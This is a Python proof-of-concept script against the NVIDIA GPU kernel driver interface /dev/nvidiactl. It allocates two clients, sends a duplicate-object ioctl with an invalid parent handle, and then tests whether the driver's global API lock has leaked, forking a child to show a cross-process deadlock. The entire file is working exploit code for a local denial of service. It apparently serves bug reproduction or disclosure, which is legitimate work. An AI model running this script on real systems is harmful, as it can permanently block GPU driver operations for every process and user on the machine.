import ctypes
import fcntl
import os
import signal
import sys
import time

NV_ESC_RM_ALLOC = 0x2B
NV_ESC_RM_DUP_OBJECT = 0x34

NV01_ROOT_CLIENT = 0x00000041


def _IOWR(type_char, nr, size):
    return ((2 | 1) << 30) | (ord(type_char) << 8) | nr | (size << 16)


class NVOS64_PARAMETERS(ctypes.Structure):
    _fields_ = [
        ("hRoot", ctypes.c_uint32),
        ("hObjectParent", ctypes.c_uint32),
        ("hObjectNew", ctypes.c_uint32),
        ("hClass", ctypes.c_uint32),
        ("pAllocParms", ctypes.c_uint64),
        ("pRightsRequested", ctypes.c_uint64),
        ("paramsSize", ctypes.c_uint32),
        ("flags", ctypes.c_uint32),
        ("status", ctypes.c_uint32),
    ]


class NVOS55_PARAMETERS(ctypes.Structure):
    _fields_ = [
        ("hClient", ctypes.c_uint32),
        ("hParent", ctypes.c_uint32),
        ("hObject", ctypes.c_uint32),
        ("hClientSrc", ctypes.c_uint32),
        ("hObjectSrc", ctypes.c_uint32),
        ("flags", ctypes.c_uint32),
        ("status", ctypes.c_uint32),
    ]


IOCTL_RM_ALLOC = _IOWR("F", NV_ESC_RM_ALLOC, ctypes.sizeof(NVOS64_PARAMETERS))
IOCTL_RM_DUP = _IOWR("F", NV_ESC_RM_DUP_OBJECT, ctypes.sizeof(NVOS55_PARAMETERS))


def rm_alloc(fd, h_root, h_parent, h_class, h_object_new=0):
    params = NVOS64_PARAMETERS()
    params.hRoot = h_root
    params.hObjectParent = h_parent
    params.hObjectNew = h_object_new
    params.hClass = h_class

    buf = bytearray(bytes(params))
    fcntl.ioctl(fd, IOCTL_RM_ALLOC, buf)
    result = NVOS64_PARAMETERS.from_buffer_copy(buf)
    return result.hObjectNew, result.status


def rm_dup_object(
    fd, h_client, h_parent, h_object, h_client_src, h_object_src, flags=0
):
    params = NVOS55_PARAMETERS()
    params.hClient = h_client
    params.hParent = h_parent
    params.hObject = h_object
    params.hClientSrc = h_client_src
    params.hObjectSrc = h_object_src
    params.flags = flags

    buf = bytearray(bytes(params))
    fcntl.ioctl(fd, IOCTL_RM_DUP, buf)
    result = NVOS55_PARAMETERS.from_buffer_copy(buf)
    return result.hObject, result.status


def child_probe():
    try:
        fd = os.open("/dev/nvidiactl", os.O_RDWR)
    except OSError:
        os._exit(2)

    try:
        _, _status = rm_alloc(fd, 0, 0, NV01_ROOT_CLIENT)
        os.close(fd)
        os._exit(0)
    except Exception:
        os.close(fd)
        os._exit(1)


def main():
    print("verifying baseline")
    pid = os.fork()
    if pid == 0:
        child_probe()
    else:
        _, exit_status = os.waitpid(pid, 0)
        exit_code = os.WEXITSTATUS(exit_status) if os.WIFEXITED(exit_status) else -1
        if exit_code != 0:
            print(f"baseline failed (exit_code={exit_code})")
            sys.exit(1)

    ctl_fd = os.open("/dev/nvidiactl", os.O_RDWR)

    h_client_a, status = rm_alloc(ctl_fd, 0, 0, NV01_ROOT_CLIENT)
    print(f"client a: handle={h_client_a:#x}, status={status:#x}")
    assert status == 0

    h_client_b, status = rm_alloc(ctl_fd, 0, 0, NV01_ROOT_CLIENT)
    print(f"client b: handle={h_client_b:#x}, status={status:#x}")
    assert status == 0

    invalid_parent = 0xDEADBEEF
    print(f"triggering dup_object with invalid parent={invalid_parent:#x}")

    _, dup_status = rm_dup_object(
        ctl_fd,
        h_client=h_client_b,
        h_parent=invalid_parent,
        h_object=0,
        h_client_src=h_client_a,
        h_object_src=h_client_a,
    )
    print(f"dup_object status={dup_status:#x}")

    _, same_status = rm_alloc(ctl_fd, 0, 0, NV01_ROOT_CLIENT)
    if same_status == 0x2F:
        print(
            f"same-thread alloc status={same_status:#x} (NV_ERR_INVALID_LOCK_STATE - API lock held)"
        )
    elif same_status == 0:
        print("same-thread alloc succeeded - lock not leaked, bug may be patched")
        os.close(ctl_fd)
        sys.exit(1)
    else:
        print(f"same-thread alloc status={same_status:#x} (unexpected)")

    print("forking child to test cross-process deadlock")
    pid = os.fork()
    if pid == 0:
        child_probe()
    else:
        deadline = time.time() + 5
        while time.time() < deadline:
            result = os.waitpid(pid, os.WNOHANG)
            if result[0] != 0:
                exit_code = os.WEXITSTATUS(result[1]) if os.WIFEXITED(result[1]) else -1
                print(f"child exited with code {exit_code} - no deadlock")
                break
            time.sleep(0.1)
        else:
            print("child deadlocked after 5s - API lock permanently leaked")
            print("RM operations that require the global API lock are blocked")
            os.kill(pid, signal.SIGKILL)

    os.close(ctl_fd)


if __name__ == "__main__":
    main()
